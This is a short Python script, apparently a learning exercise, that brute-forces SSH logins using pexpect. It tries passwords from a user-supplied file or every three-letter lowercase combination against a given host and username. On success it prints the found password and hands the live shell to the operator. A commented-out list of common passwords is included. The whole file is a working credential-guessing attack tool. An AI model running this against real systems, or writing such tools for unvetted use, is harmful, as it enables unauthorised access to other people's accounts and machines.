#!/usr/bin/python3

# first script to automate login wirh pexpect

import sys
import pexpect
import itertools


'''passwd = ["password123", "letmein", "admin", "123456", "qwerty"]''' #test list for 5 common passwords

def generate_combinations(alphabet):
    return [''.join(p) for p in itertools.product(alphabet, repeat=3)] #3 for 3 characters

def trylogin(host, user, passwords):
    for passwd in passwords:
        attempt = 0
        while attempt < 3:  # Allow up to 3 attempts per session
            print(f"Trying password: {passwd}")
            
            # Spawn a new SSH session
            connStr = f"ssh {user}@{host}"
            child = pexpect.spawn(connStr, timeout=5)

            # Look for password prompt or possible failure messages
            ret = child.expect(["password:", pexpect.EOF, pexpect.TIMEOUT], timeout=5)
            
            if ret == 0:  # Found password prompt
                child.sendline(passwd)
                result = child.expect(["\\$", "try again"], timeout=5)

                if result == 0:  # Successful login
                    print(f"Success! Password found: {passwd}")
                    child.interact()  # Give control to the user
                    return

                elif result == 1:  # Incorrect password, connection will drop soon
                    print("Incorrect password.")
                    break
            
            else:  # Connection dropped or timed out
                print("Connection Failed.")
                break

    print("Password didn't work, I give up")

if len(sys.argv) < 4:
    print("Usage:")
    print("  ./sshbrute.py -f <password_file> <host> <user>")
    print("  ./sshbrute.py -g <host> <user>") #uses all 3 letter combos from "abcdefghijklmnopqrstuvwxyz"
    sys.exit(1)

mode = sys.argv[1]
host = sys.argv[-2]
user = sys.argv[-1]

if mode == "-f":  # Read passwords from file
    password_file = sys.argv[2]
    try:
        with open(password_file, 'r') as file:
            passwords = [line.strip() for line in file]
    except FileNotFoundError:
        print(f"Error: File '{password_file}' not found.")
        sys.exit(1)

elif mode == "-g":  # Generate passwords using all 3 letter combos from alphabet
    alphabet = "abcdefghijklmnopqrstuvwxyz"
    passwords = generate_combinations(alphabet)

else:
    print("Invalid mode. Use -f for file input or -g for all 3-character alphabet combos.")
    sys.exit(1)

# Run login attempts
trylogin(host, user, passwords)
